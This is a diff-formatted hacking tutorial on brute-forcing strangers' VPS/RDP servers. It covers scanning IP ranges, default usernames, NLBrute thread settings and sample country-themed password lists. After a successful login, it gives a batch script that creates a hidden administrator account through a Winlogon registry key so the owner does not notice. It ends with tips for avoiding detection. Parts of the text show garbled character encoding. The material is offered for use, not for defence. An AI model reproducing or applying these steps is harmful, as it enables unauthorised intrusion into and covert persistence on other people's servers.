@@ -1,0 +1,318 @@
+WHAT IS A VPS/RDP AND WHAT IS USE FOR
+
+ 
+
+A Virtual Private Server (VPS) is a virtual machine sold as a service by an Internet hosting service. A VPS runs its own copy of an operating system (OS), and customers may have superuser-level access to that operating system instance, so they can install almost any software that runs on that OS.
+
+ 
+
+why we need to use them?!
+
+ 
+
+when you try to crack some accounts on your own PC, you need to wait a lot of time and you need fast internet and traffic and more issues
+
+like when you try to user cracking with SentryMBA may this take about 1 day to check all of the passwords! and it's same about VPS cracking!
+
+and also VPS are stronger, faster, and more acceptable that home PC!
+
+
+
+ 
+
+WHAT TOOL IS RECOMMENDED TO USE?!
+
+ 
+
+Actually, for connecting to a VPS, you need the VPS IP address, User, and Password! and you should connect them with REMOTE DESKTOP CONNECTION (search on windows search bar)
+
+ 
+
+THIS IS A QUESTION'S!
+
+ 
+
+HOW TO GET IP ADDRESSES?!
+
+ 
+
+you can get them by using site's below and you need to scan them with Kport Scan for each country!
+
+ 
+
+FOR SPECIFIC COUNTRY
+
+
+https://www.countryi...y_selection.php
+
+FOR SPECIFIC DATACENTER!
+
+https://myip.ms/
+
+HOW TO GET USERS?!
+
+most data centers use public users for their VPS
+
+the most users:
+
+admin
+
+                                                                         administrator (can be different from the country language!)
+
+user
+
+guest
+
+ 
+
+HOW TO GET PASSWORDS?!
+
+ 
+
+you must make the password list on your own! and it's linked to your creativity! and of course experience
+
+
+
+HOW WE CAN CRACK VPS/RDP'S?
+
+
+after getting IP ranges and scan them! you need to make the password list! and it's different for each country!
+
+ 
+
+1- open up NLbrute
+
+2- Set Thread by this setting:
+
+âœ… SETTING THREAD IN NLBRUTE BY SERVER POWER âœ…
+
+ 
+
+IF PPS WAS UNDER 25, THREAD SHOULD BE 10
+
+IF PPS WAS UNDER 40, THREAD SHOULD BE 200
+
+IF PPS WAS UNDER 70, THREAD SHOULD BE 300
+
+IF PPS WAS Between 90 to 100, THREAD SHOULD BE 400
+
+IF PPS WAS BETWEEN 120 TO 200, THREAD SHOULD BE 500
+
+IF PPS WAS BETWEEN 200 TO 300, THREAD SHOULD BE 600
+
+IF PPS WAS BETWEEN 300 TO 400, THREAD SHOULD BE 700
+
+IF PPS WAS BETWEEN 400 TO 500, THREAD SHOULD BE 800
+
+IF PPS WAS HIGHER THAN 500, THREAD SHOULD BE 1000
+
+IF PPS WAS HIGHER THAN 700, THREAD SHOULD BE 1200
+
+3- load your PasswordList
+
+4- load your Scanned IP ranges
+
+5- load your Users!
+
+6- Start Cracking! (it takes a lot of time something like 23H, and it's not easy)
+
+
+
+ 
+
+WHAT WE'RE GONNA DO FIRST WHEN WE GET HITS?!
+
+ 
+
+1- Connect to VPS with Remote Desktop Connection
+
+2- Going to! WebBrowser and go to History! if you find anything it means that someone uses this VPS! and you need to make a hidden user! so The builder will not notice your presence!
+3-writethis commands on a notepad and save it as the .bat file! so when you open this bat file this make a hidden user on your VPS!
+
+cd\
+cls
+
+REM"vps hide use creator"
+
+REM------------------------------
+
+@echo off
+
+set /p user=PLS INSERT YOUR USERNAME:
+
+set /p pass=PLS INSERT YOUR PASSWORD:
+
+net user/add %user% %pass%
+
+net localgroup administrators/add %user%
+
+reg add"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0
+
+pause
+
+
+4- go to task manager and performance and look at uptime! if it was low, you don't need to be a worry! no one uses this VPS before you!
+
+
+
+HOW TO WRITE A PASSWORD LIST?!
+
+
+ 
+
+this is an important part! you need a powerful password list to crack VPS!
+
+ 
+
+for making that you need to pay attention and be patient! cause it takes time!
+
+ 
+
+ 
+
+we have many types of password list! like name, location, car name, random numbers, and more!
+
+ 
+
+ 
+
+for example! you want to crack Germany datacenters! you should make a password list by using their famous place's names and more! or, you can use public passwords like admin, password123, numbers and more ...
+
+ 
+
+ 
+
+ 
+
+admin123
+
+ 
+
+admin@pruned_19242052
+
+ 
+
+admin#123
+
+ 
+
+~admin_123
+
+ 
+
+admin_2018
+
+ 
+
+admin_2017
+
+ 
+
+admin__!@#
+
+ 
+
+!admin!
+
+ 
+
+ 
+
+and more ...
+
+ 
+
+ 
+
+Berlin123
+
+ 
+
+Berlin@pruned_19242052
+
+ 
+
+Berlin#123
+
+ 
+
+~Berlin12$
+
+ 
+
+Berlin100%
+
+ 
+
+Berlin_12#
+
+ 
+
+ 
+
+for Russians use their language for password and also users!
+
+ 
+
+ 
+
+Ð°Ð´Ð¼Ð¸Ð½Ð¸ÑÑ‚Ñ€Ð°Ñ‚Ð¾Ñ€ : administrator
+
+ 
+
+Ð°Ð´Ð¼Ð¸Ð½ : admin
+
+ 
+
+Ð³Ð¾ÑÑ‚ÑŒ : guest
+
+ 
+
+ 
+
+ 
+
+ÐœÐ¾ÑÐºÐ²Ð°@pruned_19242052
+
+ 
+
+ÐœÐ¾ÑÐºÐ²Ð°%25
+
+ 
+
+ÐœÐ¾ÑÐºÐ²Ð°$123
+
+ 
+
+ÐœÐ¾ÑÐºÐ²Ð°~`1
+
+ 
+
+ÐœÐ¾ÑÐºÐ²Ð°@pruned_40658351
+
+
+@pruned_40658351ÐœÐ¾ÑÐºÐ²Ð°
+
+
+ 
+
+ANY TIPS TO CRACK VPS?
+
+ 
+
+- don't try to scan IP on famous Datacenter like Hetzener, 1&1, Amazon ETC ...
+- remember! you need to be patient and you need Creativity skills to make password lists!
+- first, before crack on cracked VPS, check if someone uses that or not!
+- try hard passwords! but not too hard!
+- if you are a beginner in VPS cracking don't try crack on big datacenters! do it with smaller
+- china and Asian countries use public passwords! you can get hits Easy
+
+F.A.Q
+
+
+IS IT EASY TO GET A LOT OF HITS?
+OF COURSE, IT'S NOT EASY! JUST IMPROVE YOUR CREATIVITY SKILL
+
+IF THEY FOUND THAT IM USE THEIR VPS, THEN WHAT HAPPENED?
+YOU FUCKED
+
